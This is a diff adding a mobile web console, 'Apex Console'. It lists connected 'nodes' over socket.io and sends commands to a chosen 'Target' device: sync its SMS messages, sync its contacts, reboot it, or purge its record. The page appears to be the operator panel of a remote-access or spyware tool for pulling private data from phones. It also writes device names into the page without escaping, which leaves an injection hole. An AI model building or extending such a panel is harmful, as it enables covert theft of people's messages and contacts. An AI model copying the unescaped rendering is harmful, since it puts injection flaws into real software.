@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Apex Console</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="/socket.io/socket.io.js"></script>
+
+    <style>
+        :root { --bg: #050510; --accent: #00ffcc; --panel: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; padding-bottom: 20px; }
+        
+        header { padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 1.2rem; margin: 0; color: var(--accent); }
+        
+        .container { display: flex; flex-direction: column; padding: 15px; gap: 20px; }
+        .glass { background: var(--panel); border: 1px solid rgba(255,255,255,0.1); padding: 15px; border-radius: 12px; }
+        
+        .device-item { padding: 12px; background: rgba(255,255,255,0.03); margin-bottom: 8px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; border: 1px solid transparent; cursor: pointer; }
+        .device-item.active { border-color: var(--accent); background: rgba(0,255,204,0.05); }
+        
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .btn { background: #1a1a2e; border: 1px solid #444; color: white; padding: 12px; border-radius: 8px; font-size: 0.85rem; font-weight: 500; cursor: pointer; }
+        .btn:active { background: var(--accent); color: #000; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>APEX // MOBILE</h1>
+        <div id="conn" style="font-size: 0.7rem; color: #888;">Connecting...</div>
+    </header>
+
+    <div class="container">
+        <div class="glass">
+            <h2 style="font-size: 1rem; margin-top:0;">Active Nodes</h2>
+            <ul id="list" style="list-style:none; padding:0; margin:0;"></ul>
+        </div>
+
+        <div class="glass">
+            <h2 style="font-size: 1rem; margin-top:0;">Command Module</h2>
+            <div id="target" style="font-size: 0.8rem; color: var(--accent); margin-bottom: 10px;">Select a device below</div>
+            <div class="controls">
+                <button class="btn" onclick="sendCommand('SYNC_SMS')">Sync SMS</button>
+                <button class="btn" onclick="sendCommand('SYNC_CONTACTS')">Sync Contacts</button>
+                <button class="btn" onclick="sendCommand('Reboot')">Reboot</button>
+                <button class="btn" onclick="removeDevice()" style="border-color:#ff4a4a">Remove</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let selected = null;
+
+        socket.on('connect', () => document.getElementById('conn').innerText = 'Online');
+        socket.on('disconnect', () => document.getElementById('conn').innerText = 'Offline');
+
+        // FIX: Load existing devices on refresh
+        socket.on('initial_state', (devices) => {
+            Object.values(devices).forEach(d => renderDevice(d));
+        });
+
+        socket.on('device_status', (d) => renderDevice(d));
+
+        function renderDevice(d) {
+            let el = document.getElementById(d.deviceName);
+            if (!el) {
+                el = document.createElement('li');
+                el.id = d.deviceName;
+                el.className = 'device-item';
+                el.onclick = () => { 
+                    selected = d.deviceName; 
+                    document.getElementById('target').innerText = "Target: " + d.deviceName;
+                    document.querySelectorAll('.device-item').forEach(i => i.classList.remove('active'));
+                    el.classList.add('active');
+                };
+                document.getElementById('list').appendChild(el);
+            }
+            el.innerHTML = `<span>${d.deviceName}</span><span style="color:${d.status === 'Connected' ? 'var(--accent)' : '#ff4a4a'}">${d.status}</span>`;
+        }
+
+        socket.on('device_removed', (name) => {
+            const el = document.getElementById(name);
+            if(el) el.remove();
+            if(selected === name) {
+                selected = null;
+                document.getElementById('target').innerText = "Select a device below";
+            }
+        });
+
+        function sendCommand(cmd) { if(selected) socket.emit('controller_command', { targetDevice: selected, command: cmd }); }
+        function removeDevice() { if(selected) socket.emit('purge_device_record', { deviceName: selected }); }
+    </script>
+</body>
+</html>
